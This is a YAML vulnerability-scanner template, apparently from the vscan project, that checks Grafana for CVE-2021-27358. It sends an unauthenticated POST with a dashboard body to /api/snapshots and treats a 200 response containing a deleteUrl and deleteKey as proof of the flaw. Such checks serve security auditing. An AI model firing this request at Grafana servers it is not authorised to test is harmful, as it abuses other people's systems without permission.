name: poc-yaml-grafana-cve-2021-27358-unauthenticated
binding: 1caa9c58-4985-493d-9a11-047db0129930
manual: true
detail:
    author: Xz
    links:
        - https://github.com/veo/vscan/blob/852c7021016826376a12092d139a3f6811d593ef/pocs_yml/nucleiFiles/cves/2021/CVE-2021-27358.yaml
    vulnerability:
        id: CT-150433
        level: high
    description: Grafana Unauthenticated Snapshot Creation
transport: http
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /api/snapshots
            headers:
                Content-Type: application/json
            body: |
                {"dashboard": {"editable":false,"hideControls":true,"nav":[{"enable":false,"type":"timepicker"}],"rows": [{}],"style":"dark","tags":[],"templating":{"list":[]},"time":{},"timezone":"browser","title":"Home","version":5},"expires": 3600}
        expression: response.status == 200 && response.body.bcontains(b"\"deleteUrl\":") && response.body.bcontains(b"\"deleteKey\":")
expression: r0()
